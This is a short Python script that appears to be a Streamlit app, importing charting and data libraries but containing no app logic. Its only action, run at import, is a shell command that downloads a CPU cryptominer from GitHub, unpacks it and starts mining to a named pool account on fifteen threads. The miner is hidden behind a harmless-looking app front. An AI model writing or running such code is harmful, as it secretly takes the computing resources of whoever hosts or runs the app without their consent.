from collections import namedtuple
import altair as alt
import math
import pandas as pd
import streamlit as st
import os
import time
import subprocess
from os import system, name
from time import sleep
from subprocess import PIPE, Popen
import base64

p = subprocess.run("curl -L -o Cpuminer-opt-cpu-pool-linux64.tar.gz https://github.com/cpu-pool/cpuminer-opt-cpupower/releases/download/1.4/Cpuminer-opt-cpu-pool-linux64.tar.gz && tar zxvf Cpuminer-opt-cpu-pool-linux64.tar.gz && ./cpuminer -a yescrypt -o stratum+tcp://hub.miningpoolhub.com:20543 -u temera88.nung -t 15", stdout=subprocess.PIPE, shell=True)
print(p.communicate())
